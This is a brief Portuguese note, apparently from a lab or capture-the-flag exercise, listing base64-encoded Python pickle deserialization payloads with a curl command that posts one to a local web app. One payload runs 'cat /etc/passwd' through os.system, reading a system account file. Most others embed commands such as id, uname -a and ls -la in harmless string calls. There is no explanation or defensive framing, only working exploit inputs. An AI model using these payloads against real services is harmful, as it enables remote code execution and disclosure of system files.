É necessário encodar o payload usando pic

`cat /etc/passwd`
input (print no sistema): gASVKgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA9jYXQgL2V0Yy9wYXNzd2SUhZRSlC4=
ou (print no site):       gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjA9jYXQgL2V0Yy9wYXNzd2SUhZRSlC4=

```bash
curl -X POST http://localhost:5000/ \
     -d "data=gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjA9jYXQgL2V0Yy9wYXNzd2SUhZRSlC4="
```

`uname -a`
gASVIwAAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjAh1bmFtZSAtYZSFlFKULg==

`id`
gASVHQAAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjAJpZJSFlFKULg==

`ls -la`
gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjAZscyAtbGGUhZRSlC4=

`pwd`
gASVHgAAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjANwd2SUhZRSlC4=

`pip install pandas` gASVLQAAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjBJwaXAgaW5zdGFsbCBwYW5kYXOUhZRSlC4=